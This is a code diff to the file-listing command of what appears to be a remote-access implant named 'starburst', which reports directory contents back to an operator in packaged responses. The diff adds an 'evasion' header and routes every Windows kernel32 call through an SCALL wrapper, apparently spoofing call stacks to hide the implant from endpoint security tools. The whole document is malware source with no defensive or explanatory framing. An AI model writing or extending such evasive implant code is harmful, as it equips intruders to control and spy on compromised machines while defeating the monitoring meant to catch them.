@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_LS
 
@@ -30,10 +31,10 @@ auto declfn starburst::cmd_ls(
     str_concat( path_buf, symbol<char*>( const_cast<char*>( "\\*" ) ) );
 
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
     WIN32_FIND_DATAW fd = {};
-    HANDLE h_find = inst.kernel32.FindFirstFileW( wpath, &fd );
+    HANDLE h_find = (HANDLE)SCALL( inst, kernel32.FindFirstFileW, wpath, &fd );
 
     if ( h_find == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -44,7 +45,7 @@ auto declfn starburst::cmd_ls(
     // build TLV response with file entries
     auto pkg = package_create( inst );
     if ( !pkg ) {
-        inst.kernel32.FindClose( h_find );
+        SCALL( inst, kernel32.FindClose, h_find );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -63,7 +64,7 @@ auto declfn starburst::cmd_ls(
 
     do {
         char name[260] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, fd.cFileName, -1, name, 260, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, fd.cFileName, -1, name, 260, nullptr, nullptr );
 
         // skip . and ..
         if ( name[0] == '.' && (name[1] == '\0' || (name[1] == '.' && name[2] == '\0')) )
@@ -78,9 +79,9 @@ auto declfn starburst::cmd_ls(
         package_add_byte( inst, entries, is_dir );
 
         count++;
-    } while ( inst.kernel32.FindNextFileW( h_find, &fd ) );
+    } while ( SCALL( inst, kernel32.FindNextFileW, h_find, &fd ) );
 
-    inst.kernel32.FindClose( h_find );
+    SCALL( inst, kernel32.FindClose, h_find );
 
     // pack full path for file browser integration
     {
@@ -89,8 +90,8 @@ auto declfn starburst::cmd_ls(
             memory::copy( full_path, path, path_len < 515 ? path_len : 515 );
         } else {
             wchar_t cwd_w[260] = { 0 };
-            inst.kernel32.GetCurrentDirectoryW( 260, cwd_w );
-            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, cwd_w, -1, full_path, 520, nullptr, nullptr );
+            SCALL( inst, kernel32.GetCurrentDirectoryW, 260, cwd_w );
+            SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, cwd_w, -1, full_path, 520, nullptr, nullptr );
         }
         package_add_string( inst, pkg, full_path );
     }
